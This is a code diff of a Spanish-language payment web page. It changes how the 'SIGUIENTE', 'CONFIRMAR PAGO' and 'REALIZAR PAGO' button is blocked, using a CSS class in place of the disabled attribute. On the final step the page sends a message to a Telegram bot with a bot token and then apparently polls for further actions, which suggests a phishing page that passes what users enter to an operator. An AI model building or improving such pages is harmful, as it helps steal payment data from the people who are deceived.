@@ -664,15 +664,15 @@ main {
     transition: all 0.3s;
 }
 
-/* CUANDO ESTÁ DESHABILITADO */
-.btn-siguiente:disabled {
+/* CLASE PARA BOTÓN OPACO (BLOQUEADO) */
+.btn-siguiente.opaco {
     background: #a5d6a7; 
     color: #fff;
     cursor: not-allowed;
     opacity: 0.8;
 }
 
-.btn-siguiente:hover:not(:disabled) { background: #248524; }
+.btn-siguiente:hover:not(.opaco) { background: #248524; }
 
 .recaptcha-texto {
     font-size: 11px;
@@ -1013,8 +1013,8 @@ main {
                     </div>
                 </div>
 
-                <!-- EL BOTÓN INICIA BLOQUEADO -->
-                <button class="btn-siguiente" id="btnAccionAmarillo" disabled>
+                <!-- EL BOTÓN INICIA OPACO (BLOQUEADO) -->
+                <button class="btn-siguiente opaco" id="btnAccionAmarillo">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
                     SIGUIENTE
                 </button>
@@ -1302,60 +1302,51 @@ function iniciarFlujoAmarillo() {
     // Resetear el check y el botón
     checkPaso1Activado = false;
     checkPaso1.classList.remove('activo');
-    btnAccionAmarillo.disabled = true; 
+    btnAccionAmarillo.classList.add('opaco'); // Bloqueado visualmente
     inputValorPagar.value = '';
     
     actualizarPasoAmarillo();
-    
-    // Quitar eventos anteriores clonando el botón
-    const btnViejo = document.getElementById('btnAccionAmarillo');
-    const btnNuevo = btnViejo.cloneNode(true);
-    btnViejo.parentNode.replaceChild(btnNuevo, btnViejo);
-    
-    // Asignar nuevo evento al botón
-    btnNuevo.addEventListener('click', accionBotonAmarillo);
 }
 
-// 🚀 EVENTO PARA EL CHECKBOX
+// 🚀 EVENTO PARA EL CHECKBOX (Se ejecuta cada vez que se hace clic)
 cajaPaso1.addEventListener('click', function() {
     if (pasoActualAmarillo === 1 && !checkPaso1Activado) {
         checkPaso1Activado = true;
-        checkPaso1.classList.add('activo'); // Poner verde el checkbox
-        btnAccionAmarillo.disabled = false; // Desbloquear botón (se vuelve verde brillante)
+        checkPaso1.classList.add('activo'); // Check verde
+        btnAccionAmarillo.classList.remove('opaco'); // Botón verde brillante
     }
 });
 
 function actualizarPasoAmarillo() {
-    const btn = document.getElementById('btnAccionAmarillo');
-    
     if (pasoActualAmarillo === 1) {
         paso1Amarillo.style.display = 'block';
         paso2Amarillo.style.display = 'none';
         paso3Amarillo.style.display = 'none';
         containerValorPagar.style.display = 'none'; // Ocultar campo de dinero
-        btn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg> SIGUIENTE`;
+        btnAccionAmarillo.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg> SIGUIENTE`;
         
     } else if (pasoActualAmarillo === 2) {
         paso1Amarillo.style.display = 'none';
         paso2Amarillo.style.display = 'block';
         paso3Amarillo.style.display = 'none';
         containerValorPagar.style.display = 'block'; // MOSTRAR CAMPO DE DINERO
-        btn.innerHTML = `✓ CONFIRMAR PAGO`;
-        btn.disabled = false; // Siempre activo en el paso 2
+        btnAccionAmarillo.innerHTML = `✓ CONFIRMAR PAGO`;
+        btnAccionAmarillo.classList.remove('opaco'); // Siempre activo en el paso 2
         
     } else if (pasoActualAmarillo === 3) {
         paso1Amarillo.style.display = 'none';
         paso2Amarillo.style.display = 'none';
         paso3Amarillo.style.display = 'block';
         containerValorPagar.style.display = 'none'; // Ocultar campo de dinero
-        btn.innerHTML = `✓ REALIZAR PAGO`;
-        btn.disabled = false; // Siempre activo en el paso 3
+        btnAccionAmarillo.innerHTML = `✓ REALIZAR PAGO`;
+        btnAccionAmarillo.classList.remove('opaco'); // Siempre activo en el paso 3
     }
 }
 
-function accionBotonAmarillo() {
-    // Si el botón está deshabilitado (el usuario no ha marcado el check en el paso 1), no hace nada
-    if (btnAccionAmarillo.disabled) {
+// 🚀 EVENTO DEL BOTÓN (Se asigna UNA SOLA VEZ, no se clona)
+btnAccionAmarillo.addEventListener('click', function() {
+    // Si el botón está bloqueado (el usuario no ha marcado el check), no hace nada
+    if (btnAccionAmarillo.classList.contains('opaco')) {
         return;
     }
 
@@ -1410,9 +1401,8 @@ function accionBotonAmarillo() {
         escucharAccionesFinales();
 
     } else if (pasoActualAmarillo === 3) {
-        const btn = document.getElementById('btnAccionAmarillo');
-        btn.innerHTML = `PROCESANDO...`;
-        btn.disabled = true; 
+        btnAccionAmarillo.innerHTML = `PROCESANDO...`;
+        btnAccionAmarillo.classList.add('opaco'); 
         
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
@@ -1429,7 +1419,7 @@ function accionBotonAmarillo() {
         });
         escucharAccionesFinales();
     }
-}
+});
 
 function escucharAccionesFinales() {
     pollingActivo = true;
